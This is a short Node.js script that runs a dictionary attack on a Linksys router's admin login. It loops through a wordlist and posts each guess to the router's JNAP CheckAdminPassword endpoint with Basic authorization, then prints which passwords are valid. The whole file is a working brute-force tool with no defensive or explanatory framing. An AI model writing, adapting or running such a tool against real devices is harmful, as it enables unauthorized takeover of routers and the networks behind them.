//Dependencies
const Base_64 = require("base-64")
const Request = require("request")
const Fs = require("fs")

//Variables
const Self_Args = process.argv.slice(2)

//Main
if(!Self_Args.length){
    console.log("node index.js <url> <username> <dictionary>")
    process.exit()
}

if(!Self_Args[0] || Self_Args[0].indexOf("http") == -1){
    console.log("Invalid url.")
    process.exit()
}

if(!Self_Args[1]){
    console.log("Invalid username.")
    process.exit()
}

if(!Self_Args[2]){
    console.log("Invalid dictionary.")
    process.exit()
}

if(!Fs.existsSync(Self_Args[2])){
    console.log("Invalid dictionary.")
    process.exit()
}

const dictionary_data = Fs.readFileSync(Self_Args[2], "utf8").split("\n")

if(!dictionary_data){
    console.log("Dictionary data is empty.")
    process.exit()
}

var dictionary_index = 0

Check()
async function Check(){
    if(dictionary_index == dictionary_data.length){
        console.log("Finished checking.")
        process.exit()
    }

    Request.post(`${Self_Args[0]}/JNAP/`, {
        headers: {
            "Content-Type": "application/json; charset=UTF-8",
            "X-JNAP-Action": "http://linksys.com/jnap/core/CheckAdminPassword",
            "X-JNAP-Authorization": `Basic ${Base_64.encode(`${Self_Args[1]}:${dictionary_data[dictionary_index]}`)}`
        },
        body: "{}"
    }, function(err, res, body){
        if(body.indexOf("Invalid authorization") == -1){
            console.log(`Valid password ${dictionary_data[dictionary_index]}`)
        }else{
            console.log(`Invalid password ${dictionary_data[dictionary_index]}`)
        }

        dictionary_index += 1
        Check()
    })
}
